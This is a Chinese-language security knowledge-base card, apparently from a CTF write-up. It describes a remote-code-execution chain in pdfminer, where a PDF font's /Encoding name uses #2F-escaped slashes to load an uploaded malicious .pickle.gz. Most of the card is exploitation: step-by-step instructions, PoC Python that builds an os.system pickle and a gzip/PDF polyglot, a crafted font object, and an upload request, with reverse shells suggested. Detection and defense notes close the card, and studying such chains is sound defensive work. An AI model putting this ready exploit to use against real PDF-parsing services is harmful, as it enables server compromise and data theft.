---
id: web-python-deserialization-pdfminer-cmap-pickle-encoding-path-traversal
title: 'pdfminer CMapDB pickle 反序列化：PDF /Encoding 名 #2F 路径穿越加载攻击者上传的 .pickle.gz'
type: scenario
domain: web
path: web/python/deserialization
technique: pdfminer-cmapdb-pickle-load-encoding-path-traversal
tags:
- python
- pdfminer
- pickle
- deserialization
- path-traversal
- pdf
- rce
- file-upload
- ctf
- cmap
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V214
  verified_at: '2026-11-07T04:23:40+08:00'
  notes: '已对照原文与7张图核对：CMapDB._load_data 的 %s.pickle.gz、CMAP_PATH/默认 cmap 目录拼接、get_cmap_from_spec→get_cmap→_load_data 链、/Encoding 的 #2F 路径穿越与 -H 后缀、pickle opcode、stored-block gzip 追加最小 PDF 的 polyglot、反弹 shell 与 flag 均一致；与 PLY/Django 等 pickle 卡为不同 sink。未在本机复现。'
url: /docs/web/python/deserialization/web-python-deserialization-pdfminer-cmap-pickle-encoding-path-traversal/
draft: false
kb_aliases:
- pdfminer CMapDB
- CMapDB._load_data
- pdfminer pickle 反序列化
- PDF Encoding 路径穿越
- '#2F 编码斜杠'
- CMapName RCE
- pickle.gz polyglot
---

## 一句话结论

pdfminer 的 `CMapDB._load_data()` 会把 PDF 字体 `/Encoding` 中的 CMapName 拼成 `<name>.pickle.gz`，从 `CMAP_PATH`/默认 cmap 目录读取并直接 `pickle.loads`；PDF name 中可用 `#2F` 表示斜杠，传入绝对路径（如 `#2Fapp#2Fuploads#2FAttack-H`）后 `os.path.join` 会忽略前缀目录，从而加载攻击者上传到 Web 上传目录的恶意 `.pickle.gz`，在解析 PDF 时执行任意代码。

## 原理

- **sink 代码**：`CMapDB._load_data(cls, name)` 先 `name.replace("\0", "")`，再 `filename = "%s.pickle.gz" % name`；候选目录为 `os.environ.get("CMAP_PATH", "/usr/share/pdfminer/")` 和 `os.path.join(os.path.dirname(__file__), "cmap")`；对每个目录执行 `path = os.path.join(directory, filename)`，若文件存在则 `gzip.open(path)` 并 `pickle.loads(gzfile.read())`。
- **name 来自 PDF 字体**：`PDFFont.get_cmap_from_spec(spec, strict)` 调用 `_get_cmap_name(spec, strict)` 从字体字典的 `/Encoding` 取 CMapName，再交给 `CMapDB.get_cmap(cmap_name)` → `_load_data(cmap_name)`。因此攻击者可通过 PDF 内容控制 `name`。
- **路径穿越**：PDF name 以 `/` 分隔，`/` 不能直接出现在名字里，但 PDF 规范允许 `#XX` 十六进制转义，`#2F` 即 `/`。构造 `/Encoding /#2Fapp#2Fuploads#2FAttack-H`，解析后 name 为 `/app/uploads/Attack-H`，filename 为 `/app/uploads/Attack-H.pickle.gz`；由于是绝对路径，`os.path.join(directory, filename)` 返回该绝对路径，前缀 cmap 目录被绕过。
- **CMap 名约束**：`_get_cmap_name` 对名字有格式要求（水平/垂直模式，如 `Identity-H`、`Identity-V`、`OneByteIdentityH/V` 等），普通自定义名通常要带 `-H`/`-V` 后缀才会被当作 CMap 名。因此恶意文件命名为 `Attack-H.pickle.gz`，PDF 中写 `Attack-H`。
- **上传与触发**：攻击者先把恶意 `.pickle.gz` 上传到应用可写的已知目录（示例 `/app/uploads`），再上传/提交带恶意 `/Encoding` 的 PDF；应用调用 pdfminer 解析 PDF 时走到 `_load_data`，加载该 pickle。
- **pickle payload**：用 `__reduce__` 返回 `(os.system, (cmd,))` 生成标准 pickle；也可用 pickle 文本 opcode（如 `(S"cmd"\nios\nsystem\n.`）精确控制反序列化范围，忽略文件尾部脏数据。
- **PDF/gzip polyglot**：若上传接口只接受/校验 PDF，可把文件做成同时是合法 gzip 和最小 PDF：先写入一个 gzip 成员承载 pickle，再用 `zlib.compressobj(level=0, method=zlib.DEFLATED, wbits=31)`（stored block，带 gzip wrapper）把最小 PDF 明文（如 `trailer <</Root 1>> xref`）压缩后追加为第二个 gzip 成员；`gzip.open` 读取所有成员，`pickle.loads` 只消费第一个 pickle 流并忽略尾部数据，PDF 校验则能看到可解析的 PDF 结构。
- **为什么成立**：pdfminer 信任 PDF 内的 CMapName 并把它当文件路径；`os.path.join` 遇到绝对路径会丢弃前缀；CMap 文件格式是 gzip 包裹的 pickle，默认无签名/完整性校验；应用通常允许用户上传 PDF 到可预测目录，两者结合即形成“文件上传 + 路径穿越 + pickle 反序列化”的完整 RCE 链。

## 触发条件

- 应用使用 pdfminer.six（或包含 `CMapDB._load_data` 的版本）解析用户上传的 PDF。
- 攻击者可控制 PDF 字体的 `/Encoding`/CMapName，且可把恶意 `.pickle.gz` 写到 CMap 名指向的路径（已知上传目录、可预测文件名或其它任意写入口）。
- 恶意 CMap 名需满足 pdfminer 的命名规则（通常带 `-H`/`-V` 后缀），并指向实际存在的文件。
- 解析进程对上传目录有读权限；若上传接口校验 PDF，需要 polyglot 或额外文件。
- 目标未对 pdfminer 的 CMap 加载做白名单/沙箱隔离。

## 利用步骤

1. 确认目标使用 pdfminer 解析 PDF，并找到可写上传目录与文件名规则（示例 `/app/uploads`）。
2. 生成恶意 pickle：定义 `__reduce__` 返回 `(os.system, ("<cmd>",))`，`pickle.dumps` 后写入 gzip；或用文本 opcode 控制 pickle 流。
3. 若上传接口要求 PDF，构造 polyglot：gzip 成员（pickle）+ stored-block gzip 包装的最小 PDF 明文；上传为 `Attack-H.pickle.gz`。
4. 构造 PDF：Type0 字体、`/Encoding /#2Fapp#2Fuploads#2FAttack-H`（斜杠用 `#2F`），保留最小页面/内容流使 pdfminer 进入字体解析。
5. 提交/上传该 PDF，触发 pdfminer 解析；`CMapDB._load_data` 加载 `/app/uploads/Attack-H.pickle.gz` 并 `pickle.loads`。
6. 命令执行；若无回显，可反弹 shell 或把结果写到 Web 可访问目录再读取。

## PoC

生成恶意 CMap（gzip + pickle）：

```python
import gzip, os, pickle

class Attack:
    def __reduce__(self):
        return (os.system, ('id > /app/static/pwned.txt',))

with gzip.open("Attack-H.pickle.gz", "wb") as f:
    f.write(pickle.dumps(Attack()))
```

若需要 polyglot（同时是合法 PDF），用 stored-block gzip 追加最小 PDF：

```python
import zlib

minimal_pdf = b'trailer\n<</Root 1>>\nxref\n'
comp = zlib.compressobj(level=0, method=zlib.DEFLATED, wbits=31)
gz_pdf = comp.compress(minimal_pdf) + comp.flush()
with open("Attack-H.pickle.gz", "ab") as f:
    f.write(gz_pdf)
```

恶意 PDF 的关键字体对象：

```text
4 0 obj
<<
/Type /Font
/Subtype /Type0
/BaseFont /HeiseiMin-W3
/Encoding /#2Fapp#2Fuploads#2FAttack-H
/DescendantFonts [6 0 R]
>>
endobj
```

上传 CMap 与 PDF 的请求（示例）：

```http
POST /upload HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="Attack-H.pickle.gz"
Content-Type: application/octet-stream

<gzip/pickle bytes>
------boundary--
```

## 变体与关联

- 变体：`-V` 垂直模式；把绝对路径换成 `../../../` 相对穿越；利用其它上传点/日志写入把文件放到可预测路径。
- 变体：用 pickle 文本 opcode 精确控制流，或用 `__reduce__` 调 `subprocess`/`builtins.eval` 等；配合无回显时写 Web 目录、反弹 shell。
- 变体：同类“库从用户可控路径加载 pickle”的问题：PLY yacc 的 `picklefile`（CVE-2025-56005）、Django 文件缓存 `.djcache`、ComfyUI 模型加载等，机制相近但 sink 不同。
- 关联卡片：[[web-python-deserialization-ply-yacc-picklefile-rce]]（库参数可控路径加载 pickle）、[[web-python-deserialization-django-file-cache-pickle-rce]]（缓存目录写 pickle 触发）、[[web-python-deserialization-comfyui-loadtrainingdataset-torch-load-pickle-rce]]（模型加载 pickle）、[[ai-security-rag-security-pdf-tounicode-cmap-parser-differential]]（PDF CMap 解析差异，非 pickle sink）。

## 检测与防御

- **检测**：PDF 字体 `/Encoding` 出现 `#2F`、`..`、绝对路径、异常 CMap 名（尤其指向 `uploads`/`tmp` 等可写目录）；pdfminer 进程读取 `<upload_dir>/*.pickle.gz` 并调用 `pickle.loads`；上传目录出现 `.pickle.gz` 或同时具备 PDF/gzip 特征的文件。
- **检测**：解析 PDF 的进程异常执行 `os.system`/`subprocess`、访问 `/app/static` 等 Web 目录，或出现反向 shell 连接。
- **防御**：升级/修补 pdfminer，禁止从 PDF 可控名字加载 pickle，改为固定 CMap 白名单或内嵌只读 CMap 数据；对 CMapName 做严格校验（拒绝 `#2F`、`..`、绝对路径和非字母数字字符）；把 PDF 解析放在低权限、只读文件系统、无网络的沙箱/容器中；上传目录与 cmap 目录隔离，禁止上传文件被解析器当 CMap 读取；WAF 作为补充。
- **边界**：本文在 CTF 环境验证（可控制上传目录与文件名）；真实应用需要存在可写上传目录且 CMap 名可控，否则链不成立。
